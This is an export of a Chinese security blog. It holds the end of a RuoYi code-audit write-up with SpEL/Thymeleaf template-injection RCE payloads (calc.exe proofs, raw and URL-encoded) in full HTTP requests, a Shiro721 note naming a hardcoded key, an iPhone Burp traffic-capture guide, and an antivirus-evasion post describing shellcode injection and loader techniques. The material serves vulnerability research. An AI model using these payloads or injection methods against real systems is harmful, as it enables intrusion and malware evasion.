class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>183<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.9/monitor/cache<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=aa74c322-b8a5-46a4-81d1-66dcf34f5380<br><br><span class="language-llvm">cacheName<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;fragment<span class="hljs-operator">=</span><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>d</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708253245-ea9bc2e7-0bec-4b3d-a912-3fccce1c2b13.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708277321-a00604bd-8199-4078-91f8-3503e93743a1.png"></p><h3 id="漏洞分析-17"><a href="#漏洞分析-17" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参见 5.1 小节的漏洞分析，内容基本一致</p><h2 id="5-3-注入接口-monitor-cache-getValue（V4-6-1"><a href="#5-3-注入接口-monitor-cache-getValue（V4-6-1" class="headerlink" title="5.3 注入接口/monitor/cache/getValue（V4.6.1&lt;Version&lt;V4.7.2）"></a>5.3 注入接口<code>/monitor/cache/getValue</code>（V4.6.1&lt;Version&lt;V4.7.2）</h2><h3 id="漏洞复现-18"><a href="#漏洞复现-18" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>payload 如<code>/monitor/cache/getKeys</code>接口，修改其数据包的接口为<code>/monitor/cache/getValue</code>即可；</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">// payload(空格绕过检查)<br>$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;<br>// URL编码<br>%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%2e%65%78%65%22%29%7d<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getValue</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>183<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.9/monitor/cache<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=aa74c322-b8a5-46a4-81d1-66dcf34f5380<br><br><span class="language-llvm">cacheName<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;fragment<span class="hljs-operator">=</span><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>d</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708679715-5a083bc2-0c82-491f-8303-e7f14c4ff203.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708759501-a920d5de-dc89-4f71-82ad-218a63b72b3b.png"></p><h3 id="漏洞分析-18"><a href="#漏洞分析-18" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参见 5.1 小节的漏洞分析，内容基本一致</p><h2 id="5-4-注入接口-demo-form-localrefresh-task（V4-6-1"><a href="#5-4-注入接口-demo-form-localrefresh-task（V4-6-1" class="headerlink" title="5.4 注入接口/demo/form/localrefresh/task（V4.6.1&lt;Version&lt;V4.7.2）"></a>5.4 注入接口<code>/demo/form/localrefresh/task</code>（V4.6.1&lt;Version&lt;V4.7.2）</h2><h3 id="漏洞复现-19"><a href="#漏洞复现-19" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">// payload(空格绕过检查)<br>$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;<br>// URL编码<br>%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%2e%65%78%65%22%29%7d<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/demo/form/localrefresh/task</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>171<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.9/monitor/cache<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=aa74c322-b8a5-46a4-81d1-66dcf34f5380<br><br><span class="language-llvm">fragment<span class="hljs-operator">=</span><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>d</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708826574-2ba596ac-a9b0-4398-8722-fef9253fb612.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708839413-b5442d18-4029-4b7a-a2bf-5ad38d675950.png"></p><h3 id="漏洞分析-19"><a href="#漏洞分析-19" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参见 5.1 小节的漏洞分析，内容基本一致</p><h1 id="6-Shiro721-反序列化-RCE（"><a href="#6-Shiro721-反序列化-RCE（" class="headerlink" title="6 Shiro721 反序列化 RCE（&lt;V4.6.2）"></a>6 Shiro721 反序列化 RCE（&lt;V4.6.2）</h1><h3 id="漏洞复现-20"><a href="#漏洞复现-20" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本次复现该实验的环境为 jdk1.8.0_461 + ruoyi V4.6.0；</p><p>这里需要注意，如果使用的不是 jdk8（例如 jdk17 等） 进行搭建的环境是无法复现该实验的，这是由于 jdk8 以上的版本的反射受到了限制，从而导致无法发现有效的利用链及其回显方式；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754622535752-37948002-934e-41b3-8f10-348cf28974be.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754622570637-5d7f90da-770d-4b81-8f70-57e28cdec03d.png"></p><h3 id="漏洞分析-20"><a href="#漏洞分析-20" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在文件<code>RuoYi-4.6.0\ruoyi-admin\src\main\resources\application.yml</code>中可以找到 Shiro 中设置的固定加密密钥<code>zSyK5Kp6PZAAjlT+eeNMlg==</code></p><p>详细的漏洞原理请查找相关的 shiro721 的漏洞分析文章；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754623024675-f05936fd-a9b8-4b90-ac9c-12477d2408f8.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.cnblogs.com/backlion/p/18896463">https://www.cnblogs.com/backlion/p/18896463</a></li><li><a href="https://wsyu9a.github.io/blog/2024/03/17/240317%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%88%86%E6%9E%90/">https://wsyu9a.github.io/blog/2024/03/17/240317%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%88%86%E6%9E%90/</a></li><li><a href="https://blog.takake.com/posts/7219/">https://blog.takake.com/posts/7219/</a></li><li><a href="https://forum.butian.net/share/4328">https://forum.butian.net/share/4328</a></li><li><a href="https://www.freebuf.com/articles/web/417704.html">https://www.freebuf.com/articles/web/417704.html</a></li><li><a href="https://xz.aliyun.com/news/10405">https://xz.aliyun.com/news/10405</a></li><li><a href="https://github.com/phith0n/tls_proxy">https://github.com/phith0n/tls_proxy</a></li><li><a href="https://cn-sec.com/archives/4194322.html">https://cn-sec.com/archives/4194322.html</a></li><li><a href="https://blog.csdn.net/weixin_43263451/article/details/126543803">https://blog.csdn.net/weixin_43263451&#x2F;article&#x2F;details&#x2F;126543803</a></li><li><a href="https://www.qwesec.com/2025/02/thymeleafSSTI.html">https://www.qwesec.com/2025/02/thymeleafSSTI.html</a></li><li><a href="https://www.dalon.top/archives/ruo-yi-ruoyi-4.8.0hou-tai-rce-fu-xian">https://www.dalon.top/archives/ruo-yi-ruoyi-4.8.0hou-tai-rce-fu-xian</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzkyNTYxNDAwNQ==&mid=2247484714&idx=1&sn=19e40a91e637794253c8691d7ffe40c6&poc_token=HJFNoGij9wzHj2_xpMBIdF0PXd1BqOcZoDkY3gFO">https://mp.weixin.qq.com/s?__biz&#x3D;MzkyNTYxNDAwNQ&#x3D;&#x3D;&amp;mid&#x3D;2247484714&amp;idx&#x3D;1&amp;sn&#x3D;19e40a91e637794253c8691d7ffe40c6&amp;poc_token&#x3D;HJFNoGij9wzHj2_xpMBIdF0PXd1BqOcZoDkY3gFO</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>Java</tag>
      
      <tag>文件上传</tag>
      
      <tag>ruoyi</tag>
      
      <tag>代码审计</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>苹果iphone手机抓包新姿势</title>
    <link href="/2025/08/14/%E8%8B%B9%E6%9E%9Ciphone%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85%E6%96%B0%E5%A7%BF%E5%8A%BF/"/>
    <url>/2025/08/14/%E8%8B%B9%E6%9E%9Ciphone%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85%E6%96%B0%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<p>电脑所需工具：BurpSuite</p><p>手机所需工具：Shadowrocket（大家都是学“这个”的，不至于这个软件都下不到吧~）</p><p>要求手机和电脑处于同一局域网</p><p>电脑启动一个该局域网 ip 的端口监听，端口随意</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755137800115-661a21db-e56d-4bfc-9751-091f6d3199a1.png" alt="img"></p><p>在手机的 Shadowrocket 软件中添加一个新的本地节点，打开主页面右上角有个<code>+</code>；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755138011009-205d50a9-dc16-476f-b99d-e0ba0bf46e83.jpeg" alt="img"></p><p>启动代理，将路由设置为<code>代理</code>，即全局代理</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755138088070-09b19024-365d-4fc4-a197-646ec029a9e2.jpeg" alt="img"></p><p>然后使用浏览器访问该代理的 ip 和 port，即电脑中 burpsuite 监听的 ip 和 port，下载证书，然后到设置中对描述文件进行安装</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755138164358-64d40ea7-baa9-41de-9ee0-3603ba7c6251.jpeg" alt="img"></p><p>完成上述步骤以后，在打开<code>设置</code>-》<code>通用</code>-》<code>关于本机</code>-》<code>证书信任设置</code>，打开 burp 证书的信任，然后即可实现抓包，不放心安全问题在使用完毕以后进行关闭即可；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755138287540-cf89cc63-fcec-48f5-9d56-fea6c50d826e.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具配置</tag>
      
      <tag>APP抓包</tag>
      
      <tag>小程序抓包</tag>
      
      <tag>burp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免入土（六）BasicLoader</title>
    <link href="/2025/07/19/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E5%85%AD%EF%BC%89BasicLoader/"/>
    <url>/2025/07/19/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E5%85%AD%EF%BC%89BasicLoader/</url>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><p>本文主要内容是本人收集到的公开的且还算有价值的 Loader ，这些 Loader 并不是能够直接使用的 Loader，要将其相互结合或者，结合其他的方式去使用的。</p><p>主要是我目前发现现在的知识学习似乎都存在了门槛，大家都喜欢把一个东西描述得非常高大上，让我这种普通人不敢靠近，我的目的呢，就是把这些高大上的东西普通化，让大家都能看得懂（看不懂也没关系，可以根据以下内容在进行学习，因为以下内容简化得比较严重，建议结合代码一块看，代码肯定是简化的，主要是为了让大家理解这个过程），能够知道这个东西的原理。</p><p>本文的主要目的只是将目前已有的一些方法收集起来，并编写一份 demo 示例供大家学习参考。(越写越觉得这门技术深奥，就不想写了，后面就几个没写而已，大家将就着看吧)</p><p>代码放在 github 仓库：<a href="https://github.com/candyb0x/BasicLoader">https://github.com/candyb0x/BasicLoader</a>（反正没啥用，大家随便看看得了）</p><table><thead><tr><th>难度</th><th>技术名称</th><th>简介</th></tr></thead><tbody><tr><td>⭐ <strong>简单</strong></td><td>CreateRemoteThread</td><td>最常用远程线程注入</td></tr><tr><td></td><td>QueueUserAPC</td><td>把 Shellcode 加到 APC 队列</td></tr><tr><td></td><td>SetThreadContext</td><td>修改线程上下文指向恶意代码</td></tr><tr><td></td><td>Manual Mapping (基础)</td><td>不用 LoadLibrary 手动加载</td></tr><tr><td></td><td>TLS Callback 执行</td><td>在 TLS 回调中执行 Loader</td></tr><tr><td></td><td>SEH Loader</td><td>异常处理向量中执行恶意代码</td></tr><tr><td></td><td>VEH Loader</td><td>Vectored Exception Handler 注入</td></tr></tbody></table><table><thead><tr><th>难度</th><th>技术名称</th><th>简介</th></tr></thead><tbody><tr><td><strong>进阶</strong></td><td>Reflective DLL Injection</td><td>反射式 DLL 注入</td></tr><tr><td></td><td>Process Hollowing</td><td>替换进程映像</td></tr><tr><td></td><td>Early Bird APC</td><td>提前投递 APC 注入</td></tr><tr><td></td><td>Transacted Hollowing</td><td>使用事务注入进程</td></tr><tr><td></td><td>Process Doppelganging</td><td>NTFS 特性实现注入</td></tr><tr><td></td><td>Herpaderping</td><td>修改映像后再执行</td></tr><tr><td></td><td>AtomBombing</td><td>全局原子表注入</td></tr><tr><td></td><td>Thread Hijacking</td><td>劫持已有线程执行</td></tr></tbody></table><h1 id="2-CreateRemoteThread（Shellcode-Dll）"><a href="#2-CreateRemoteThread（Shellcode-Dll）" class="headerlink" title="2. CreateRemoteThread（Shellcode + Dll）"></a>2. CreateRemoteThread（Shellcode + Dll）</h1><p><strong>CreateRemoteThread注入是一种进程注入技术，通过以下步骤在目标进程中执行代码</strong>：</p><ol><li>获取目标进程句柄 - 使用<code>OpenProcess</code>打开目标进程</li><li>在目标进程中分配内存 - 使用<code>VirtualAllocEx</code>分配可执行内存</li><li>写入代码到目标进程 - 使用<code>WriteProcessMemory</code>写入shellcode或DLL路径</li><li>创建远程线程执行 - 使用<code>CreateRemoteThread</code>在目标进程中创建线程执行代码</li></ol><h1 id="3-ApcInjection（Shellcode-Dll）"><a href="#3-ApcInjection（Shellcode-Dll）" class="headerlink" title="3. ApcInjection（Shellcode + Dll）"></a>3. ApcInjection（Shellcode + Dll）</h1><p> <strong>Asynchronous Procedure Call（异步过程调用，APC）</strong> 是 Windows 内核里的一种<strong>线程异步回调机制</strong>。  </p><p> Windows 的多线程需要线程在「合适时机」去执行<strong>额外的回调任务</strong>（比如：I&#x2F;O 完成通知、延迟执行某个回调）。为了不打断线程当前正在做的事，而是等到线程进入「安全点」或「空闲点」时再执行。  </p><ul><li>内核模式 I&#x2F;O：I&#x2F;O 完成后要回调用户态函数。  </li><li>用户态：允许程序自己用 <code>QueueUserAPC</code> 给线程排任务。</li></ul><p> 每个线程内部有一个<strong>APC 队列</strong>：  </p><ul><li>用户模式 APC 队列（User-Mode APC Queue）  </li><li>内核模式 APC 队列（Kernel-Mode APC Queue）</li></ul><p> 线程在运行时，如果：  </p><ul><li>调用了<strong>可警告型等待函数</strong>：如 <code>SleepEx</code>, <code>WaitForSingleObjectEx</code>，并且 <code>bAlertable=TRUE</code>；  </li><li>在新线程刚刚启动时（Early Bird 场景）；  </li><li>被 <code>NtAlertResumeThread</code> 恢复时（会触发 alert）；</li></ul><p>就会检查 APC 队列是否有任务，如果有，就调用队列里排队的 APC 回调函数；</p><p><strong>APC 注入是一种常见的 Windows 注入技术，主要流程如下</strong>：</p><ol><li>打开目标进程（OpenProcess）。</li><li>申请远程内存（VirtualAllocEx）。</li><li>写入 shellcode（WriteProcessMemory）。</li><li>查找目标进程的线程句柄（OpenThread）。</li><li>使用 QueueUserAPC 将 shellcode 地址排入目标线程的 APC 队列。</li><li>等待目标线程进入可警告状态（如 SleepEx、WaitForSingleObjectEx 等），APC 被执行。</li></ol><h1 id="4-SetThreadContext（Shellcode-Dll）"><a href="#4-SetThreadContext（Shellcode-Dll）" class="headerlink" title="4. SetThreadContext（Shellcode + Dll）"></a>4. SetThreadContext（Shellcode + Dll）</h1><p><code>SetThreadContext</code> 是 Windows 提供的 API，用来设置线程的上下文（寄存器、指令指针等）。<br>在免杀中可以通过：</p><ul><li>修改目标线程的 <strong>指令寄存器（EIP&#x2F;RIP）</strong>，让线程「执行」你想要的 shellcode，而不显式调用可疑 API（如 <code>CreateRemoteThread</code> 或 <code>NtCreateThreadEx</code>）。</li><li>因为 SetThreadContext 本身是一个系统合法的调试 API，被检测规则较少，相对隐蔽。</li></ul><p><strong>SetThreadContext注入利用流程：</strong></p><ol><li>创建目标进程（挂起状态），使用 CreateProcess，带 CREATE_SUSPENDED 标志，启动目标进程但不让其立即运行。</li><li>在目标进程分配内存，用 VirtualAllocEx 在目标进程空间分配一块内存，用于存放shellcode或DLL路径。</li><li>写入payload，用 WriteProcessMemory 将shellcode或DLL路径写入上一步分配的内存。</li><li>获取目标线程上下文，用 GetThreadContext 获取主线程的上下文（寄存器等信息）。</li><li>修改线程上下文，修改上下文中的指令指针（EIP&#x2F;RIP），让其指向你写入的shellcode，或指向 LoadLibraryA 并设置参数为DLL路径。</li><li>设置新的线程上下文，用 SetThreadContext 将修改后的上下文写回目标线程。</li><li>恢复线程运行，用 ResumeThread 恢复线程，目标进程会从你指定的位置（shellcode或LoadLibraryA）开始执行。</li></ol><h1 id="5-Manual-Mapping（Dll）"><a href="#5-Manual-Mapping（Dll）" class="headerlink" title="5. Manual Mapping（Dll）"></a>5. Manual Mapping（Dll）</h1><p>Windows 加载 DLL 时，正常流程是：</p><ul><li>调用 <code>LoadLibrary</code>（或者 <code>LdrLoadDll</code>） → 加载 DLL → 调用入口点（DllMain）</li><li>系统内部做了：分配内存、解析导入表（IAT）、重定位（relocation）、初始化 TLS、调用入口点等</li></ul><p><strong>Manual Mapping</strong> 的核心思路：</p><ul><li>自己（手动）完成 <code>LoadLibrary</code> 做的事：分配内存、把 PE 文件内容写过去、修复重定位、修复导入表、初始化 TLS、手动调用入口点（DllMain）</li></ul><p>而<strong>不调用 LoadLibrary &#x2F; LdrLoadDll</strong> 这些容易被检测或 Hook 的系统 API。</p><h1 id="6-TLSCallback-Shellcode-Dll"><a href="#6-TLSCallback-Shellcode-Dll" class="headerlink" title="6. TLSCallback(Shellcode + Dll)"></a>6. TLSCallback(Shellcode + Dll)</h1><p>TLS（Thread Local Storage）是 Windows 提供的一种机制，用来为每个线程分配线程局部变量。  </p><p>PE 文件（EXE&#x2F;DLL）中可以定义 TLS 回调函数（TLS Callback）：</p><ul><li>在进程或线程创建&#x2F;终止时，由系统自动调用这些回调函数。</li><li>调用时机：在调用 <code>DllMain</code> 之前，甚至在入口点之前。</li></ul><p>也就是说，如果一个 DLL 或 EXE 定义了 TLS Callback：</p><ul><li>加载时（<code>LoadLibrary</code>&#x2F;<code>LdrLoadDll</code>&#x2F;启动进程时）</li><li>系统会<strong>隐式</strong>先执行这些回调</li></ul><p>正常的安全检测通常只关注：</p><ul><li><code>DllMain</code> &#x2F; <code>main</code> &#x2F; <code>WinMain</code> &#x2F; <code>wWinMain</code> 等入口点</li><li>常规注入行为（如 <code>CreateRemoteThread</code>、<code>NtCreateThreadEx</code>）</li><li>某些导出函数的调用</li></ul><p>TLS Callback 是隐藏在 PE 文件结构里的，属于<strong>系统自动调用</strong>：</p><ul><li><p>很多杀软&#x2F;EDR 并不解析或执行 TLS Callback，只是检查 <code>DllMain</code>。</p></li><li><p>手动在 TLS Callback 里放恶意逻辑：</p></li><li><p>shellcode 加载</p></li><li><p>行为注入</p></li><li><p>反射加载自身</p></li><li><p>系统会<strong>自动执行</strong>这些逻辑，但安全产品可能<strong>忽略了</strong>。</p></li></ul><p>不知道为啥，这个实验在 x64 死活弄不出来，也没 debug 到原因，x86 是成功了；</p><h1 id="7-SEHLoader（Shellcode-Dll）"><a href="#7-SEHLoader（Shellcode-Dll）" class="headerlink" title="7. SEHLoader（Shellcode + Dll）"></a>7. SEHLoader（Shellcode + Dll）</h1><p> SEH（Structured Exception Handling）是 Windows 的结构化异常处理机制，用来捕获并处理运行时异常（比如访问冲突、除零错误等）。 </p><p><strong>SEH Loader</strong> 是一种利用 SEH 